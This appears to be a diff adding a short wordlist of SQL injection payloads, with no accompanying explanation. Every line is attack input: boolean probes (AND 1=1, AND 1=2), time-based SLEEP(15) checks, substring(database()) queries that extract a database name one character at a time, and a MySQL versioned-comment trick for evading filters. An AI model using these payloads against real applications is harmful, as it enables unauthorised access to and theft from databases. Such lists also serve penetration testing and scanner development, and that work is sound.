@@ -1,0 +1,15 @@
+xxxx AND IF(substring(database(),1,1)=’a’, SLEEP(15),1)#
+xxxx AND IF(length(database())=’1’, SLEEP(15),1)#
+user_id”=”xxxx AND substring(database(),1,1)=’b’#
+user_id”=”xxxx AND substring(database(),2,1)=’u’#
+user_id”=”xxxx AND substring(database(),3,1)=’g’#
+user_id”=”xxxx AND substring(database(),2,1)=’a’#
+user_id”=”xxxx AND substring(database(),2,1)=’b’#
+user_id”=”xxxx AND substring(database(),2,1)=’c’#
+xxxx AND substring(database(),1,1)=’a'#
+xxxx AND length(database())=’2'#
+xxxx AND length(database())=’1'#
+xxxx AND sleep(15)#
+xxxx AND 1=2#
+xxxx AND 1=1#
+/*!00000AND*/ /*!00000SLEEP(15)*/--+
